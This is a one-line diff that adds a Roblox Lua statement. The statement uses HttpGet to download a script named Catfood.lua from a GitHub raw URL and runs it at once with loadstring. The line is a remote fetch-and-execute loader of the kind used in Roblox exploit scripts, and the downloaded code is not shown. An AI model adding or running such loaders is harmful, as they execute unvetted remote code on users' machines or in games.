@@ -1,0 +1,1 @@
+loadstring(game:HttpGet('https://raw.githubusercontent.com/Darklovescheese/KITTTTTY/refs/heads/main/.github/workflows/Catfood.lua'))()
